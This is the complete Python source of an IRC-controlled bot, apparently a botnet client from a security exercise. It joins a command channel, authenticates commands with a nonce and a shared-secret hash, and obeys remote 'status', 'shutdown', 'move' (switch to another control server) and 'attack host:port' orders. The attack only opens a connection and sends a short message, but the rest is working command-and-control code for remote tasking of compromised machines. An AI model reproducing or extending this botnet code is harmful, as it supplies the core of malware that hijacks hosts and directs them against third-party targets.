#!/usr/bin/env python3
import socket
import random
import hashlib
import select
import sys
import time
import select


server = None
channel = None
nick = None
secret = None
hostname = None
port = None
command_count = 0
seen_nonces = set()  

#Generates a random nickname for the bot using a predefined prefix and a random number.
def generate_random_nickname():
    
    return "Bot" + str(random.randint(1, 10000))

def connect_to_irc_server(hostname, port):
    global server, channel, nick
    nick = generate_random_nickname()
    
    while True:
        try:
            temp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_server.settimeout(10)
            print(f"Attempting to connect to {hostname}:{port}")
            temp_server.connect((hostname, int(port)))
            print("Connected successfully to IRC server.")

            # Perform IRC handshake
            temp_server.send(f"NICK {nick}\r\n".encode('utf-8'))
            temp_server.send(f"USER {nick} 0 * :{nick}\r\n".encode('utf-8'))

            # Wait for welcome message and respond to PING if necessary
            while True:
                response = temp_server.recv(2048).decode('utf-8')
                if "PING" in response:
                    temp_server.send(response.replace("PING", "PONG").encode('utf-8'))
                if "001" in response:  # Welcome message received
                    break
            
            # Successfully connected and handshaked; update global server
            server = temp_server
            server.send(f"JOIN {channel}\r\n".encode('utf-8'))
            print(f"Joined channel {channel}")
            break
        
        except Exception as e:
            print(f"Failed to connect to IRC server: {e}. Retrying in 5 seconds...")
            time.sleep(5)

#Authenticates a command by verifying its MAC against an expected value.
def authenticate_command(nonce, command_secret, mac):
    
    # Check if nonce is seen before
    if nonce in seen_nonces:  
        duplicated_nonce = f"duplicated nonce, try again"
        server.send(f"PRIVMSG {channel} :{duplicated_nonce}\r\n".encode('utf-8'))
        print(duplicated_nonce)
        
        return False
    expected_mac = hashlib.sha256(f"{nonce}{command_secret}".encode()).hexdigest()[:8]
    
    # Add nonce to seen list if not seen before 
    if mac == expected_mac:
        seen_nonces.add(nonce)  
        return True
    return False

def listen_for_commands():
    global server, channel, secret, command_count
    try:
        while True:
            try:
                ready_to_read, _, _ = select.select([server], [], [], 60)
                if ready_to_read:
                    response = server.recv(2048).decode('utf-8').strip()
                    if response.startswith("PING"):
                        server.send(response.replace("PING", "PONG").encode('utf-8'))
                    elif "PRIVMSG" in response:
                        parts = response.split(':', 2)
                        if len(parts) > 2:
                            message = parts[2].strip()
                            process_command(message)
            except Exception as e:
                print(f"Connection error: {e}. Attempting to reconnect in 5 seconds...")
                time.sleep(5)
                connect_to_irc_server(hostname, port)
    except KeyboardInterrupt:
        print("KeyboardInterrupt received: exiting program.")
        shutdown_bot()
      

def process_command(message):
    global command_count, nick

    # Splitting the command and parameters, assuming space-separated format
    cmd_parts = message.split()
    if len(cmd_parts) >= 3:
        nonce, mac, command = cmd_parts[:3]
        args = cmd_parts[3:]
        
        if authenticate_command(nonce, secret, mac):
            command_count += 1  
            print(f"Received command: {command}")              
            if command == "status":
                send_status()
            
            elif command == "shutdown":
                shutdown_bot()

            elif command == "attack" and len(args) == 1:
                attack_target = args[0].split(":")
                if len(attack_target) == 2:
                    attack_hostname, attack_port_str = attack_target
                    try:
                        attack_port = int(attack_port_str)
                        perform_attack(attack_hostname, attack_port, nick, nonce)
                    except ValueError:
                        print("Invalid port number for attack command.")

            elif command == "move" and len(args) == 1:
                new_server_info = args[0].split(":")
                if len(new_server_info) == 2:
                    move_to_new_server(new_server_info[0], int(new_server_info[1]))
                else:
                    print("Invalid arguments for the move command.")
    else:
        print("Invalid command format received.")  

#Sends the bot's status back to the channel.
def send_status():
    
    status_message = f"-status {nick} {command_count}"
    debug_message = f"Sending status to {channel}: {status_message}"
    print(debug_message)  # Debugging output
    try:
        server.send(f"PRIVMSG {channel} :{status_message}\r\n".encode('utf-8'))
        print("Status message sent successfully.")
    except Exception as e:
        print(f"Failed to send status message: {e}")

#Shuts down the bot gracefully.
def shutdown_bot():
    
    shutdown_message = f"-shutdown {nick}"
    server.send(f"PRIVMSG {channel} :{shutdown_message}\r\n".encode('utf-8'))
    server.close()
    sys.exit(0)



def perform_attack(hostname, port, nick, nonce):
    report_message = ""
    attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attack_sock.setblocking(0)  

    try:
        attack_sock.connect((hostname, port))
    except BlockingIOError:
        
        pass

    try:
        _, writable, in_error = select.select([], [attack_sock], [attack_sock], 3)
        if writable:
            attack_msg = f"{nick} {nonce}\n".encode()
            attack_sock.sendall(attack_msg)
            report_message = f"-attack {nick} OK"
        elif in_error:
            report_message = f"-attack {nick} FAIL Unable to Connect or Error"
        else:
            report_message = f"-attack {nick} FAIL Timeout"
    except Exception as e:
        report_message = f"-attack {nick} FAIL {str(e)}"
    finally:
        attack_sock.close()

    #print(f"Reporting attack result: {report_message}")  
    
    try:
        server.send(f"PRIVMSG {channel} :{report_message}\r\n".encode('utf-8'))
        print("Attack result message sent successfully.")  
    except Exception as e:
        print(f"Failed to send attack result message: {e}")

def move_to_new_server(new_host, new_port):
    global server, hostname, port, channel, nick

    
    if server:
        try:
            move_message = f"-move {nick}"
            server.send(f"PRIVMSG {channel} :{move_message}\r\n".encode('utf-8'))
            print(f"Move notification sent for {nick}")
        except Exception as e:
            print(f"Error sending move notification: {e}")
        finally:
            try:
                server.shutdown(socket.SHUT_RDWR)
            except Exception as shutdown_error:
                print(f"Error shutting down socket: {shutdown_error}")
            server.close()
            print(f"Disconnected from the current server for moving to {new_host}:{new_port}")

    #reconection flag so that reconnection can happen
    server = None

    
    hostname, port = new_host, new_port

    
    print(f"Attempting to connect to the new server: {hostname}:{port}")
    connect_to_irc_server(hostname, port)


def main():
    global channel, secret, hostname, port

    if len(sys.argv) != 4:
        # Improved usage instruction by letting the user know to use "" for channel
        print("Usage: ircbot.py '<server:port>' '<channel>' '<secret>'")
        print("Note: Please ensure to encapsulate arguments with spaces or special characters (like # for channels) in quotes.")
        sys.exit(1)

    server_port, channel, secret = sys.argv[1:]
    hostname, port = server_port.split(":")

    if not channel.startswith("#"):
        channel = "#" + channel

    connect_to_irc_server(hostname, port)
    listen_for_commands()

if __name__ == "__main__":
    main()
